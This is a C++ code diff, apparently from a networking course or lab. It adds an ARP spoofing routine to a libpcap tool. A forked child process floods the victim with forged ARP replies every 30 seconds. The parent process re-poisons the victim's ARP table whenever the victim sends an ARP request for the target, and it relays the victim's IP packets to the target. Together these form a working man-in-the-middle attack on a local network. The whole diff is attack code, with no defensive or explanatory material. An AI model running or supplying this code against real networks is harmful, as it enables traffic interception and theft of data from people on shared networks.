@@ -1,4 +1,6 @@
+#include <unistd.h>
 #include "arp-spoof.h"
+#include "ipv4hdr.h"
 
 void getAttackerInfo(string interface, Mac& attackerMac, Ip& attackerIp ) {
     //get Mac Address
@@ -64,4 +66,63 @@ void getMACAddress(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMa
             break;
         }
     }
+}
+
+void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip targetIp, Ip senderIp) {
+    // Target continuously sends arp reply to sender (approx. per 90 seconds)
+	// Create Child Process to Continuously Infect ARP Table of Sender
+	pid_t pid = fork();
+	if (pid <0) {
+		cout << "Fork Failed!\n";
+		return;
+	}
+	else if (pid == 0) {
+		while(true) { 
+			cout << "Infecting Sender's ARP Table\n";
+			sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
+			sleep(30); //30 secs will be enough, since target sends arp reply every 90 seconds
+		}
+	}
+	else {
+		while (true) {
+			//Parent Process Continuously listens for Sender's packets
+			struct pcap_pkthdr* header;
+			const u_char* packet;
+			int res = pcap_next_ex(handle, &header, &packet);
+			if (res == 0 || packet== NULL ) continue;
+			if (res == -1 || res == -2) {
+				cout << "PCAP ERROR!\n";
+				break;
+			}
+			EthHdr* ethHdr = (EthHdr*)packet;
+			
+			// Only check packets from sender
+			if (ethHdr->smac_ != senderMac) {
+				continue;
+			}
+			
+			// If an ARP Request form sender looking for target is recieved
+			// Infect Sender's ARP Table again
+			if (ethHdr->type() == EthHdr::Arp) {
+				ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
+				if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {
+					cout << "Recieved ARP Request. Infecting Sender's ARP Table...\n";
+					sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
+				}
+			} 
+			// If an IP Packet from sender to target is recieved
+			// Relay the packet to target
+			else if (ethHdr->type() == EthHdr::Ip4 ) {
+				struct IPv4Hdr* ipHdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
+				if (ntohl(ipHdr->ip_src) == senderIp ) {
+					cout << "Relaying Packet to Target...\n";
+					ethHdr -> smac_ = attackerMac;
+					ethHdr -> dmac_ = targetMac;
+					
+					// Send Packet
+					pcap_sendpacket(handle, packet, header->len);
+				} 
+			}
+		}
+	}
 }
